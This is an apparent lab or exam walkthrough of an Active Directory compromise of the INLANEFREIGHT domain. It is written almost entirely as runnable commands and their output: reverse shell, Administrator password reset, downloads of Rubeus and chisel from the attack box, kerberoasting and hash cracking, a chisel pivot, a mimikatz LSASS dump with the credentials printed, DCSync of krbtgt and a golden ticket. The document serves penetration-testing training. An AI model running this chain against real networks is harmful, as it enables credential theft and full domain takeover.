# AD Exam part 1
We were left with a webshell. We can login using these credentials `admin:My_W3bsH3ll_P@ssw0rd!`

Goto `https://www.revshells.com/` and get a revershell shell to your attack box.
Reset the Administrator password using following command:
```
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString "NewP@ssw0rd!" -AsPlainText -Force)
```
Now from the attack box we can login using the following command using winRM:
```
evil-winrm -i 10.129.132.177 -u Administrator -p NewP@ssw0rd!
```

Spin up an http server on the attack box to download `Rubeus.exe` on the target.
```
wget http://10.10.14.145:8000/Rubeus.exe -OutFile Rubeus.exe -UseBasicParsing
```

Then to kerberoast execute following commands:
```
cd C:/temp
./Rubeus.exe kerberoast /nowrap
```

We were requested to kerberoast the `MSSQLSvc/SQL01.inlanefreight.local:1433` account. We find the following hash we can attempt to crack:
```
[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : MSSQLSvc/SQL01.inlanefreight.local:1433
[*] PwdLastSet             : 3/30/2022 2:14:52 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$4179975E7DFA2FD7D936B70221D75C32$583149CF953063DF2970687C50CA69359BF6002CA644D91FA85EBCC4E663125688E6CD375EC876405D9E2EBADC0DDE2352E1437E50888BB10EAB9C6A2C63F789BA6894184C56061F96EE14919BF677C2AD697253EB795F7B710EBAD3675D16A35E220F72112036A8AF9F93D4A750940765C800E66B48C9B151A864A1FDBD7E9C147026B71B0091FF8A2880C26B2ACC1E9AC7E9EF6F39B398A46759FB0E851929CC7CEADB28938382C138D276E068990AE14525ABF4C19FFE7C7119C53381C108F2822ABA612C03D767E8DEB356E320377D5C50A6587EBBB2B3BCA39A30D6A3D507EEA5A4BA87422ADFFBCAF724FDC4289FB0785C46ECB36D00B1C3A192F60636C7EA1F8841F67DEA2CE99AD90984AC3036E1BFFEEC207B4E7D96A6A33CA7C293E03C11D78E80C2C296C082AD177E6D46FE25F4CE063F3FE9406B7B9C7F2C54ADCC6E05B4439E8206A41F54DAC47DA6BE85CCA878C66896A12C3AA6B1D22B38C40B62CCA39F7612A78772746310F227687CF0533ED1F04DF40750A4B4F48D466AC34B04BD8123820854DC3087E97CBA16FC6BCC2EC87B4897E155C3D088F0E30D003CFEA8AF3E1856A89D637D6ECEE875AED4D93476267071534EF8DD6D7E313C0E2CDFE267713E0DEDF3564FE8037628FB8F41D8072166E59903202340CB8B94C686486B6C9F7647B35E254F2C7314FF0376CB5219F6FFFC1A2B47D50800AEB427C1D06493D61C2A755E8E08BD130E3FC9D44DF8714B8BB1917B6A666728E9449622557A6713E728A7DD9562B03C832F67A895502ADDBCABF67ADA986D33C63A17FA700F4378733DB79A9A9420E0D5CD0F927B97AF27807C85AB3D4A74F263C5519B3AE546A21E116FC78F6EA7A86D416C0202F9B0A3B530A67A937C65C2ECBA33EC7CEA841BE6202FEFF34CA0AF7FB5798897D6547EE20CB236281A6F29B621C71509BEA7105509D9E131CAD994B65BD9AF349285AB15EB6F6D8601B377ED317FBB9D6031CA32524DABEA0E6FB438302D1D46F8EE4973F4BA876BAC36CFF477B566C4E7F580340E4B665C706621329191B4FD16D46670E3FA562A4E6B36BBE5D038C38E6CD831CDE5B942D44B423C0A85BECE33F48D67D54364C136BDB1770E8FBC227379A8582F90827E73B71C37CEB15BAAA406627C5ECAD3689D214F2EFCE48D91A2355566DB0F99206B79A04143489C03D83C96E6118F6FCF7AE08D151E3E4F0A44BEC755CD8A9E4ADC61826C95780D64971CD0398142D59AA4F244F2A5994EE82F452DCD5680914A25A9D4DB3AAA3BA01B57BCF7FC473867AD748642CE62539A43E73A2D436A69D44B7345100DE7F82D526E852FD7D0DC84BA26D4EDA500BDC709CD5BDC7599261C74B1FF08742D6D623DE6ADADD6C9E64428D2E7DD5D926FB687180933D6951B8D5ED3464EB6D7353EA3E99C8CAA341F850EEA116A86D5B6E2B1B9166A418BFCB2A4ED77CFBDDEE25B35DE8B60330D628E60E378B184BCB9B3E86758E86F805B193C891F323789BA72BB37D8CE6A
```
Let's attemt to crack the hash with hashcat:
```
hashcat -m 13100 hash.txt rockyou.txt
hashcat hash.txt --show
```

We successfully cracked the hash of this account, the credentials are:
```
MSSQLSvc/SQL01.inlanefreight.local:1433:lucky7
```

Now we want to pivot to box `MS01` with ip address `172.16.6.50`... Let's get `chisel` on the pivot by executing:
```
wget http://10.10.14.145:8000/chisel.exe -OutFile chisel.exe -UseBasicParsing
```

Setup chisel to pivot:
```
#Creates a socks proxy accessible on the attack machine (server) on port 1080
#Attack box
./chisel server -v -p 1234 --socks5 --reverse 
#Pivot
./chisel client -v 10.10.14.145:1234 R:1080:socks 
```

Now let's try connecting via rdp from the attack box
```
proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:lucky7
```

Once logged into the machine let's try an LSAS dump with mimikatz (use the 64bit version, using the 32bit one works but the cleartext password is not shown only the hash):

```
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
The below seemed interesting.. a user `tpetty` seems logged in:
```
Authentication Id : 0 ; 258349 (00000000:0003f12d)
Session           : Interactive from 1
User Name         : tpetty
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/9/2025 1:53:46 AM
SID               : S-1-5-21-2270287766-1317258649-2146029398-4607
        msv :
         [00000003] Primary
         * Username : tpetty
         * Domain   : INLANEFREIGHT
         * NTLM     : fd37b6fec5704cadabb319cebf9e3a3a
         * SHA1     : 38afea42a5e28220474839558f073979645a1192
         * DPAPI    : da2ec07551ab1602b7468db08b41e3b2
        tspkg :
        wdigest :
         * Username : tpetty
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : tpetty
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Sup3rS3cur3D0m@inU2eR
        ssp :
        credman :
```

We can see this user has DCsync privileges. Let's try to take over the domain...
First let's find the domain controller:
```
echo %LOGONSERVER%
```
This results in `\\DC01`.. We can ping this DNS name to find the IP address: `172.16.6.3`.

lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt

We login as the `tpetty` user (after we configured remote access for this user on host `172.16.6.50`).
We then execute mimikatz to sync the secret keys of the `krbtgt` user:
```
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/30/2022 2:54:28 AM
Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 6dbd63f4a0e7c8b221d61f265c4a08a7
    ntlm- 0: 6dbd63f4a0e7c8b221d61f265c4a08a7
    lm  - 0: 71f5354fb6fbe151714f6721f59011dd

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6fde235c8619e8c5c87e14f2b17552d7

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 7a2c7787775bdf8b34c52a1d0f387a3d6201752ed30033d178421e7f0d7b1fe8
      aes128_hmac       (4096) : ea3a44ad8f9b7429f8b878b41b6362ff
      des_cbc_md5       (4096) : 5485514919f4ce7c

* Primary:Kerberos *
    Default Salt : INLANEFREIGHT.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 5485514919f4ce7c

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  2bb73bdf286535cca8381b1afb78b82d
    02  3b04c50704a81e6cc5125379207ffdc2
    03  2ca377dbfde6edef8e9d2a5c17b71e73
    04  2bb73bdf286535cca8381b1afb78b82d
    05  3b04c50704a81e6cc5125379207ffdc2
    06  937d38336fd33b931ff6f106c54a76a4
    07  2bb73bdf286535cca8381b1afb78b82d
    08  7a69e7697b6df4a0040bb36171a0e08e
    09  cc399ef2a6502a37f9124416f616dfd5
    10  044537a6bef7c6115fbb5842cd47be4e
    11  7a69e7697b6df4a0040bb36171a0e08e
    12  cc399ef2a6502a37f9124416f616dfd5
    13  f843a1cdec578e2ead903cb9f80073d8
    14  7a69e7697b6df4a0040bb36171a0e08e
    15  c3cb5c0aa3ebccfb636861ec22ac237c
    16  2592019b4fc371efae925414173e3b69
    17  5be090a16765c728f0b08f9a9a057012
    18  6d6b885f818a372547456fca4f974b98
    19  45b5004e455663288b5c6184d192d001
    20  7bc20dc9ecfc249ecb224fa27bbd85ce
    21  66406595b499152a9df7614d539e7a2e
    22  66406595b499152a9df7614d539e7a2e
    23  06734969c3b71aaee2e401062dfd96c3
    24  fca233890eccb4232a3f3331d47f1621
    25  8d45e2dd76d2df2e8be12cbddffb47e2
    26  21c8885ffb2a003ef6dbcbdcb65217b8
    27  868395f3f5a7dcc5d2f9ac454ea99d21
    28  58705a0138014a18c509951e3e53babd
    29  9ffa2d0920441c7b8ea25cc4ff686f4c
```


Now that we have the hash of the `krbtgt` account we can forge our own tickets to impersonate the Administrator account:
```
Rubeus.exe golden /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2270287766-1317258649-2146029398 /aes256:7a2c7787775bdf8b34c52a1d0f387a3d6201752ed30033d178421e7f0d7b1fe8 /ptt
```

Now that the ticket is imported we can login to the DC01:
```
Invoke-PSSession -ComputerName 
Cd C:/Users/Administrator/Desktop
cat flag.txt
```
We have found the content of the flag!